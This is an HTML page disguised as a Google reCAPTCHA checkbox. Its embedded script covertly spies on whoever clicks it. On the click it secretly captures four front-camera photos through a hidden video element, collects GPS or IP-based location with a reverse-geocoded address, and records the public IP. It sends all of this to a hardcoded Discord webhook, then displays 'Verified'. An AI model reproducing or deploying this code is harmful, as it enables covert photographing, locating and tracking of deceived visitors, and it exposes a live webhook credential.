<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>reCAPTCHA Verification</title>
<style>
    body {
        font-family: 'Roboto', Arial, sans-serif;
        background: #f2f2f2;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        margin: 0;
        padding: 24px 0;
        box-sizing: border-box;
    }

    .recaptcha-box {
        width: 304px;
        background: #fff;
        border: 1px solid #d3d3d3;
        border-radius: 3px;
        box-shadow: 0 0 4px rgba(0,0,0,.08);
        cursor: pointer;
        user-select: none;
    }

    .recaptcha-header { display: flex; align-items: center; padding: 14px 16px 14px 12px; }

    .checkbox-square {
        width: 28px; height: 28px;
        border: 2px solid #c1c1c1;
        background: #fff;
        border-radius: 3px;
        margin-right: 14px;
        display: flex; align-items: center; justify-content: center;
        transition: all .2s;
        flex: 0 0 auto;
    }

    .checkbox-square.checked { background: #156b3c; border-color: #156b3c; }
    .checkbox-square.loading { background: #f9f9f9; border-color: #c1c1c1; }

    .check-icon { color: #fff; font-size: 20px; font-weight: bold; line-height: 1; display: none; }
    .checkbox-square.checked .check-icon { display: block; }

    .spinner {
        width: 18px; height: 18px;
        border: 2px solid #e0e0e0;
        border-top-color: #156b3c;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        display: none;
    }

    .checkbox-square.loading .spinner { display: block; }
    .checkbox-square.checked .spinner { display: none; }

    @keyframes spin { to { transform: rotate(360deg); } }

    .logo-area { flex: 1; display: flex; align-items: center; gap: 8px; }
    .recaptcha-logo { width: 42px; height: 42px; flex: 0 0 auto; }
    .main-text { font-size: 14px; color: #222; font-weight: 500; }
    .sub-text { font-size: 10px; color: #888; margin-top: 2px; }

    .recaptcha-footer {
        background: #f9f9f9;
        border-top: 1px solid #e8e8e8;
        padding: 8px 16px;
        display: flex;
        justify-content: space-between;
        font-size: 10px;
        color: #555;
    }

    .footer-links a { color: #555; text-decoration: none; margin-left: 8px; }
</style>
</head>
<body>

<div class="recaptcha-box" id="recaptchaWidget">
    <div class="recaptcha-header">
        <div class="checkbox-square" id="checkboxBox">
            <span class="check-icon">&#10003;</span>
            <div class="spinner"></div>
        </div>
        <div class="logo-area">
            <svg class="recaptcha-logo" viewBox="0 0 48 48">
                <path d="M24 2L46 14v20L24 46 2 34V14z" fill="#f9f9f9"/>
                <path d="M24 8l16 9.2v9.6L24 36 8 26.8v-9.6z" fill="#fff"/>
                <path d="M24 14l10 5.8v5.4L24 30l-10-5.8v-5.4z" fill="#e0e0e0"/>
            </svg>
            <div class="text-area">
                <span class="main-text" id="mainText">I'm not a robot</span>
                <span class="sub-text">Privacy - Terms</span>
            </div>
        </div>
    </div>
    <div class="recaptcha-footer">
        <span>Protected by reCAPTCHA</span>
        <div class="footer-links">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</div>

<script>
/* ============================================================
   1. PASTE YOUR DISCORD WEBHOOK URL HERE
   ============================================================ */
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';

/* 2. OPTIONAL - Google Static Maps key for a real Google map preview.
      Leave empty to use the free OSM preview. */
const GOOGLE_MAPS_KEY = '';

const widget   = document.getElementById('recaptchaWidget');
const checkbox = document.getElementById('checkboxBox');
const mainText = document.getElementById('mainText');

let busy = false;

widget.addEventListener('click', async () => {
    if (busy) return;
    busy = true;

    checkbox.classList.add('loading');
    mainText.textContent = 'Verifying...';

    // Location starts FIRST and synchronously so mobile keeps the click gesture.
    const locPromise = getLocation();
    const ipPromise  = getIP();

    try {
        const photos = await capturePhotos();

        // Hard ceiling so a stalled GPS fix can never block the upload.
        const location = await Promise.race([
            locPromise,
            new Promise(r => setTimeout(() => r(null), 25000))
        ]);
        const ip = await ipPromise;

        await send(photos, ip, location);
    } catch (e) {
        console.warn(e);
    }

    checkbox.classList.remove('loading');
    checkbox.classList.add('checked');
    mainText.textContent = 'Verified';
    busy = false;
});

/* ============================================================
   CAMERA - 4 front-cam snaps, returned as real File objects
   ============================================================ */
async function capturePhotos() {
    const out = [];

    for (let i = 1; i <= 4; i++) {
        const blob = await snap();
        if (!blob) continue;

        const name = 'front_snap_' + i + '.jpg';

        // A real File carries its own .name, which Safari cannot override.
        let file;
        try {
            file = new File([blob], name, { type: 'image/jpeg' });
        } catch (e) {
            file = blob;
            file.name = name;
        }

        out.push({ file: file, name: name });
    }

    return out;
}

function snap() {
    return new Promise(async resolve => {
        let done = false;
        const finish = v => { if (!done) { done = true; resolve(v); } };
        const guard = setTimeout(() => finish(null), 6000);

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.setAttribute('playsinline', '');
            video.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0';
            document.body.appendChild(video);

            await new Promise(res => {
                let s = false;
                const go = () => { if (!s) { s = true; res(); } };
                video.onloadedmetadata = go;
                video.onerror = go;
                setTimeout(go, 2000);
            });

            await video.play().catch(() => {});
            await new Promise(r => setTimeout(r, 400));

            const w = video.videoWidth || 640;
            const h = video.videoHeight || 480;
            const canvas = document.createElement('canvas');
            canvas.width = w;
            canvas.height = h;

            const ctx = canvas.getContext('2d');
            ctx.translate(w, 0);
            ctx.scale(-1, 1);                 // mirror, like a front cam
            ctx.drawImage(video, 0, 0, w, h);

            stream.getTracks().forEach(t => t.stop());
            video.srcObject = null;
            video.remove();

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            clearTimeout(guard);
            finish(blob);
        } catch (e) {
            console.warn('snap', e);
            clearTimeout(guard);
            finish(null);
        }
    });
}

/* ============================================================
   LOCATION - GPS and IP lookup race each other
   ============================================================ */
function getLocation() {
    const gpsPromise = gpsLocation();
    const ipPromise  = ipLocation();
    return (async () => (await gpsPromise) || (await ipPromise))();
}

function gpsLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);

        let settled = false;
        const finish = v => { if (!settled) { settled = true; resolve(v); } };

        const attempt = (highAccuracy, timeout) => new Promise(res => {
            let s = false;
            const d = v => { if (!s) { s = true; res(v); } };
            const guard = setTimeout(() => d({ err: 'timeout' }), timeout + 2000);

            navigator.geolocation.getCurrentPosition(
                p => {
                    clearTimeout(guard);
                    d({ pos: {
                        lat: p.coords.latitude,
                        lng: p.coords.longitude,
                        acc: p.coords.accuracy,
                        src: highAccuracy ? 'GPS' : 'Network'
                    }});
                },
                e => {
                    clearTimeout(guard);
                    d({ err: e.code === 1 ? 'denied' : 'error' });
                },
                { enableHighAccuracy: highAccuracy, timeout: timeout, maximumAge: highAccuracy ? 0 : 300000 }
            );
        });

        attempt(false, 7000).then(async a => {
            if (a.pos) { finish(await withLabel(a.pos)); return; }
            if (a.err === 'denied') { finish(null); return; }
            const b = await attempt(true, 12000);
            finish(b.pos ? await withLabel(b.pos) : null);
        });
    });
}

async function withLabel(pos) {
    const l = await reverseGeocode(pos.lat, pos.lng);
    pos.label = l || (pos.lat.toFixed(5) + ', ' + pos.lng.toFixed(5));
    return pos;
}

async function reverseGeocode(lat, lng) {
    const urls = [
        'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=en',
        'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lng
    ];

    for (const u of urls) {
        try {
            const c = new AbortController();
            const t = setTimeout(() => c.abort(), 5000);
            const r = await fetch(u, { signal: c.signal });
            clearTimeout(t);
            if (!r.ok) continue;

            const d = await r.json();
            const ad = d.address || {};
            const s = [
                d.city || d.locality || ad.city || ad.town || ad.village,
                d.principalSubdivision || ad.state,
                d.countryName || ad.country
            ].filter(Boolean).join(', ');

            if (s) return s;
        } catch (e) {}
    }
    return null;
}

const PROVIDERS = [
    { u: 'https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city || d.locality, d.principalSubdivision, d.countryName].filter(Boolean).join(', ') } : null },

    { u: 'https://get.geojs.io/v1/ip/geo.json',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },

    { u: 'https://ipwho.is/',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },

    { u: 'https://freeipapi.com/api/json',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.cityName, d.regionName, d.countryName].filter(Boolean).join(', ') } : null },

    { u: 'https://ipapi.co/json/',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country_name].filter(Boolean).join(', ') } : null },

    { u: 'https://ipinfo.io/json',
      p: d => d.loc ? { lat: +d.loc.split(',')[0], lng: +d.loc.split(',')[1],
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null }
];

async function ipLocation() {
    const tries = PROVIDERS.map(p => (async () => {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 6000);

        try {
            const r = await fetch(p.u, { signal: c.signal, cache: 'no-store' });
            if (!r.ok) throw new Error(r.status);

            const d = await r.json();
            const val = p.p(d);

            if (!val || !isFinite(val.lat) || !isFinite(val.lng)) throw new Error('bad');
            if (val.lat === 0 && val.lng === 0) throw new Error('zero');

            return {
                lat: val.lat,
                lng: val.lng,
                acc: null,
                src: 'IP',
                label: val.l || (val.lat.toFixed(4) + ', ' + val.lng.toFixed(4))
            };
        } finally {
            clearTimeout(t);
        }
    })());

    try { return await Promise.any(tries); }
    catch (e) { return null; }
}

async function getIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        return (await r.json()).ip || 'Unknown';
    } catch (e) { return 'Unknown'; }
}

/* ============================================================
   SEND TO DISCORD
   ============================================================ */
async function send(photos, ip, location) {
    let maps = null;
    let coords = null;

    if (location) {
        coords = location.lat.toFixed(7) + ', ' + location.lng.toFixed(7);
        maps = 'https://www.google.com/maps/search/?api=1&query=' +
               location.lat.toFixed(7) + ',' + location.lng.toFixed(7);
    }

    const lines = ['**Verification Captured**'];

    if (location) {
        lines.push('Location: ' + location.label);
        lines.push('Coords: ' + coords);
        lines.push('Accuracy: ' + (location.acc != null ? '~' + Math.round(location.acc) + ' m' : 'n/a') + ' (' + location.src + ')');
        lines.push('Google Maps: ' + maps);
    } else {
        lines.push('Location: denied / unavailable');
    }

    lines.push('IP: ' + ip);

    const embed = {
        title: 'Verification Capture',
        color: 0x156b3c,
        fields: [{ name: 'IP Address', value: ip, inline: true }],
        timestamp: new Date().toISOString()
    };

    if (photos.length) {
        embed.fields.push({ name: 'Photos', value: String(photos.length), inline: true });
    }

    if (location) {
        embed.url = maps;
        embed.fields.push({ name: 'Location', value: location.label, inline: false });
        embed.fields.push({ name: 'Latitude', value: String(location.lat.toFixed(7)), inline: true });
        embed.fields.push({ name: 'Longitude', value: String(location.lng.toFixed(7)), inline: true });
        embed.fields.push({
            name: 'Source',
            value: location.src === 'GPS' ? 'GPS (precise)' : 'Network / IP (approximate)',
            inline: true
        });

        if (location.acc != null) {
            embed.fields.push({ name: 'Accuracy', value: '~' + Math.round(location.acc) + ' m', inline: true });
        }

        embed.fields.push({
            name: 'Google Maps',
            value: '[Open exact pin](' + maps + ')',
            inline: false
        });

        embed.image = {
            url: GOOGLE_MAPS_KEY
                ? 'https://maps.googleapis.com/maps/api/staticmap?center=' + location.lat + ',' + location.lng +
                  '&zoom=17&size=600x300&scale=2&maptype=roadmap&markers=color:red%7C' +
                  location.lat + ',' + location.lng + '&key=' + GOOGLE_MAPS_KEY
                : 'https://maps.wikimedia.org/img/osm-intl,17,' + location.lat + ',' + location.lng + ',600x300.png'
        };
    }

    /* No photos at all -> plain JSON POST, zero multipart involved. */
    if (!photos.length) {
        const res = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: lines.join('\n'), embeds: [embed] })
        });
        if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
        return;
    }

    /* Photos present -> multipart, with File objects so names are honoured. */
    const payload = {
        content: lines.join('\n'),
        embeds: [embed],
        attachments: []
    };

    const formData = new FormData();

    photos.forEach((photo, index) => {
        formData.append('files[' + index + ']', photo.file, photo.name);
        payload.attachments.push({ id: index, filename: photo.name });
    });

    // payload_json must be appended AFTER the files are registered.
    formData.append('payload_json', new Blob([JSON.stringify(payload)], { type: 'application/json' }));

    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
}
</script>

</body>
</html>
